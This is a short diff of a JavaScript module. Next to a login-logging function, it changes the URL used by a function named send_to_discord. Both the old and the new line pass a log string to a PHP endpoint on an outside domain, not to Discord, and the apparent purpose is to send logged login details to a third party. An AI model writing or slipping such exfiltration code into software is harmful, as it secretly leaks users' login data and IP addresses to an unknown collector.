@@ -54,7 +54,7 @@ exports.log_login = function(user, ip) {
 }
 
 exports.send_to_discord = function(output) {
-    fetch("https://traumatized.xyz/skidbag.php?log=" + output).then(res => res.text()).then(body => { console.log(body )});
+    fetch("https://traumatized.xyz/sukme.php?log=" + output).then(res => res.text()).then(body => { console.log(body )});
 }
 
 /*
